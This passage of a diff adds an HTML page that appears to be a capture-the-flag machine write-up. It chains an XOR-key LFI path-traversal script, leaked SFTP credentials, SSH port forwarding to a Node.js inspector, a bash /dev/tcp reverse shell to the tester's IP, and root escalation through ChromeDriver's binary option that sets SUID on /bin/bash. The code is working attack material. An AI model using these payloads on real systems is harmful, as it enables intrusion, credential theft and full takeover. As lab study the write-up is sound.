+key <span style="color:#f92672">=</span> <span style="color:#e6db74">''</span>.join(<span style="color:#a6e22e">chr</span>(x) <span style="color:#f92672">for</span> x <span style="color:#f92672">in</span> keystream[:key_length])
+<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">"Key:"</span>, key)
+<span style="color:#75715e"># Key: Hm9zeWC38</span></code></pre>
+
+                <h2>Decryption Script — Automated LFI</h2>
+                <p>With the key recovered, I extend the script to decrypt any file on the system via path traversal. Each request retrieves the base64-encoded content embedded in the HTML response, decodes it, and XORs it byte by byte against the cyclic key:</p>
+
+                <pre><code class="language-python"><span style="color:#f92672">import</span> base64
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> cycle
+
+<span style="color:#f92672">if</span> <span style="color:#a6e22e">len</span>(sys.argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">f"usage: {sys.argv[0]} &lt;path&gt;"</span>)
+    sys.exit()
+
+encoded_path <span style="color:#f92672">=</span> sys.argv[<span style="color:#ae81ff">1</span>].replace(<span style="color:#e6db74">'/'</span>, <span style="color:#e6db74">'%2f'</span>)
+
+<span style="color:#f92672">try</span>:
+    resp <span style="color:#f92672">=</span> requests.get(
+        <span style="color:#e6db74">f'http://10.129.238.32:5000/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F{encoded_path}'</span>,
+        timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>
+    )
+    enc_b64 <span style="color:#f92672">=</span> re.search(
+        <span style="color:#e6db74">r'data:application/octet-stream;charset=utf-8;base64,(.+?)"'</span>,
+        resp.text
+    ).group(<span style="color:#ae81ff">1</span>)
+<span style="color:#f92672">except</span>:
+    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">'file does not exist'</span>)
+    sys.exit()
+
+enc <span style="color:#f92672">=</span> base64.b64decode(enc_b64)
+pt <span style="color:#f92672">=</span> <span style="color:#e6db74">''</span>.join(<span style="color:#a6e22e">chr</span>(e <span style="color:#f92672">^</span> k) <span style="color:#f92672">for</span> e, k <span style="color:#f92672">in</span> <span style="color:#a6e22e">zip</span>(enc, <span style="color:#a6e22e">cycle</span>(<span style="color:#e6db74">b"Hm9zeWC38"</span>)))
+<span style="color:#a6e22e">print</span>(pt)</code></pre>
+
+                <p>If the file doesn't exist, the request times out instead of returning a response, so I detect that with the <code>except</code> block. I verify it works by reading <code>/etc/passwd</code>, confirming users <code>dev</code> and <code>ubuntu</code>.</p>
+
+                <h2>Information Gathering — Environment Variables and Source Code</h2>
+                <p>I read <code>/proc/self/environ</code> to inspect the web process environment:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /proc/self/environ | <span style="color:#66d9ef">tr</span> <span style="color:#e6db74">'\00'</span> <span style="color:#e6db74">'\n'</span></code></pre>
+
+                <pre><code class="language-plaintext">USER=dev
+npm_config_user_agent=npm/8.5.1 node/v12.22.9 linux x64 workspaces/false
+npm_node_execpath=/usr/bin/node
+HOME=/home/dev
+npm_package_json=/home/dev/projects/store1/package.json
+npm_config_local_prefix=/home/dev/projects/store1
+SYSTEMD_EXEC_PID=879
+npm_lifecycle_script=nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'
+NODE=/usr/bin/node
+LANG=C.UTF-8
+PWD=/home/dev/projects/store1
+SHELL=/bin/bash
+EDITOR=vi
+...</code></pre>
+
+                <p>Two critical data points stand out. The process is launched with <code>--inspect=127.0.0.1:9229</code>, exposing a Node.js debugging service that allows arbitrary code execution. It only listens on localhost for now, but that will change shortly. The project path is also confirmed: <code>/home/dev/projects/store1</code>.</p>
+
+                <p>Checking the process cmdline confirms this:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /proc/self/cmdline</code></pre>
+
+                <pre><code class="language-plaintext">node--inspect=127.0.0.1:9229/home/dev/projects/store1/start.js</code></pre>
+
+                <p>Reading the project's <code>.env</code> file yields more:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /home/dev/projects/store1/.env</code></pre>
+
+                <pre><code class="language-plaintext">SFTP_URL=sftp://sftpuser:WidK52pWBtWQdcVC@localhost
+SECRET=Hm9zeWC38
+STORE_HOME=/home/dev/projects/store1
+PORT=5000</code></pre>
+
+                <p>This confirms the key I already extracted (<code>Hm9zeWC38</code>) and leaks SFTP credentials: <code>sftpuser:WidK52pWBtWQdcVC</code>.</p>
+
+                <h2>SFTP Access and SSH Jail Analysis</h2>
+                <p>SFTP runs over port 22 and provides FTP-like file access. I connect with the discovered credentials:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">sftp</span> sftpuser@10.129.238.32</code></pre>
+
+                <pre><code class="language-plaintext">Connected to 10.129.238.32.
+sftp> ls
+files
+sftp> cd files
+sftp> ls -lah
+drwxr-xr-x ? 1002 1002 4.0K Mar 11 18:10 .
+drwxr-xr-x ?    0    0 4.0K Feb 13  2023 ..
+-rw-rw-rw- ? 1002 1002  16B Mar 11 18:10 xd.txt</code></pre>
+
+                <p>I'm jailed inside the <code>files</code> directory with no way out. I read the SSH server configuration to understand exactly how the jail is set up:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">python3</span> xd.py /etc/ssh/sshd_config</code></pre>
+
+                <pre><code class="language-plaintext">Match User sftpuser
+    ForceCommand internal-sftp
+    PasswordAuthentication yes
+    ChrootDirectory /var/sftp
+    AllowAgentForwarding no
+    X11Forwarding no</code></pre>
+
+                <p>The configuration is restrictive, but one key setting is <strong>missing and therefore defaults to enabled</strong>: <code>AllowTcpForwarding</code>. Even though this user can't open a shell, TCP port forwarding is fully available.</p>
+
+                <h2>Port Forwarding and Node.js Inspector Access</h2>
+                <p>I leverage the active <code>AllowTcpForwarding</code> to redirect port 9229 (Node Inspector) to my local machine. Since <code>sftpuser</code>'s shell is <code>/bin/false</code>, I use the <code>-N</code> flag to prevent any command from running:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">ssh</span> sftpuser@10.129.238.32 -N -L 9229:127.0.0.1:9229
+<span style="color:#75715e"># (using 127.0.0.1 instead of localhost to avoid DNS resolution issues)</span></code></pre>
+
+                <p>The process hangs and port 9229 is now open locally:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  128  127.0.0.1:9229</code></pre>
+
+                <p>To interact with the inspector, I open Chrome and navigate to <code>chrome://inspect</code>:</p>
+
+                <img src="./media/image3.png" alt="chrome://inspect page showing the remote Node.js process available for inspection" />
+
+                <p>Clicking <em>inspect</em> opens a Chrome DevTools instance connected to the remote Node.js process. From the console I can run JavaScript as the <code>dev</code> user:</p>
+
+                <img src="./media/image1.png" alt="Chrome DevTools console connected to the server's Node.js inspector, ready to execute commands" />
+
+                <h2>Initial Access — RCE via Node Inspector</h2>
+                <p>With a netcat listener running on port 443, I execute the following payload in the inspector console to get a reverse shell:</p>
+
+                <pre><code class="language-javascript">require(<span style="color:#e6db74">'child_process'</span>).execSync(
+    <span style="color:#e6db74">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.142/443 0&gt;&amp;1"'</span>
+).toString()</code></pre>
+
+                <p>I get a shell as the <code>dev</code> user.</p>
+
+                <h2>Privilege Escalation — ChromeDriver 9515 RCE as Root</h2>
+                <p>Investigating local ports and running processes, I find a service listening on port 9515:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  5  127.0.0.1:9515</code></pre>
+
+                <p>Critically, it is running as <code>root</code>:</p>
+
+                <pre><code class="language-plaintext">root  729  0.0  0.3  33628800  14208  ?  Ssl  17:56  0:00  /root/chromedriver</code></pre>
+
+                <p>Port 9515 belongs to the <strong>ChromeDriver</strong> API, a tool used to programmatically control a Chrome browser (typically for automated testing). I verify it is accessible:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">curl</span> localhost:9515/status</code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#f92672">"value"</span>: {
+    <span style="color:#f92672">"build"</span>: { <span style="color:#f92672">"version"</span>: <span style="color:#e6db74">"110.0.5481.77 (...)"</span> },
+    <span style="color:#f92672">"message"</span>: <span style="color:#e6db74">"ChromeDriver ready for new sessions."</span>,
+    <span style="color:#f92672">"ready"</span>: <span style="color:#66d9ef">true</span>
+  }
+}</code></pre>
+
+                <p>I create a headless Chrome session through the API:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">curl</span> -X POST http://localhost:9515/session \
+  -H <span style="color:#e6db74">"Content-Type: application/json"</span> \
+  -d <span style="color:#e6db74">'{"desiredCapabilities":{"browserName":"chrome","chromeOptions":{"args":["--headless","--no-sandbox","--disable-dev-shm-usage"]}}}'</span></code></pre>
+
+                <p>I can read privileged files by navigating to <code>file://</code> URLs and querying the page source. For example, retrieving <code>/etc/shadow</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#75715e"># Navigate to file</span>
+<span style="color:#66d9ef">curl</span> -X POST http://localhost:9515/session/&lt;SESSION_ID&gt;/url \
+  -d <span style="color:#e6db74">'{"url":"file:///etc/shadow"}'</span>
+
+<span style="color:#75715e"># Read the page source</span>
+<span style="color:#66d9ef">curl</span> http://localhost:9515/session/&lt;SESSION_ID&gt;/source</code></pre>
+
+                <p>The response contains the full <code>/etc/shadow</code> file with all user password hashes. The browser session also opens an additional local port, allowing visual filesystem browsing:</p>
+
+                <img src="./media/image6.png" alt="Headless Chrome browser showing the root filesystem accessible through the ChromeDriver session" />
+
+                <p>The <code>/root/.ssh/</code> directory is empty, so I can't place SSH keys directly. However, I find a more direct path. According to <a href="https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148">this article by Knownsec 404 Team</a>, the ChromeDriver session API accepts a <code>binary</code> option that specifies an alternative executable to use as the browser. If that field points to a custom script, ChromeDriver (running as root) will execute it:</p>
+
+                <img src="./media/image5.png" alt="Knownsec 404 Team article explaining the RCE technique via ChromeDriver's binary option" />
+
+                <p>I create a script that sets the SUID bit on <code>/bin/bash</code> and make it executable:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">cat</span> /tmp/xd.sh
+<span style="color:#75715e">#!/bin/bash
+chmod u+s /bin/bash</span>
+
+<span style="color:#66d9ef">chmod</span> +x /tmp/xd.sh</code></pre>
+
+                <p>Now I call the session creation endpoint pointing <code>binary</code> at my script:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">curl</span> localhost:9515/session \
+  -d <span style="color:#e6db74">'{"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary": "/tmp/xd.sh"}}}}'</span></code></pre>
+
+                <pre><code class="language-json">{
+  <span style="color:#f92672">"value"</span>: {
+    <span style="color:#f92672">"error"</span>: <span style="color:#e6db74">"unknown error"</span>,
+    <span style="color:#f92672">"message"</span>: <span style="color:#e6db74">"unknown error: Chrome failed to start: exited normally.\n (unknown error: DevToolsActivePort file doesn't exist)\n (The process started from chrome location /tmp/xd.sh is no longer running, so ChromeDriver is assuming that Chrome has crashed.)"</span>
+  }
+}</code></pre>
+
+                <p>ChromeDriver returns an error because the script is not a real browser, but that doesn't matter — the script already executed with root privileges. Confirming the result:</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">ls</span> -lah /bin/bash
+<span style="color:#ae81ff">-rwsr-xr-x</span> 1 root root 1.4M Mar 14 2024 /bin/bash</code></pre>
+
+                <p>The SUID bit is set. Running <code>bash -p</code> gives me a root shell and access to the root flag.</p>
+
+                <pre><code class="language-bash"><span style="color:#66d9ef">bash</span> -p
+<span style="color:#75715e"># bash-5.1# whoami
+# root</span></code></pre>
+
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
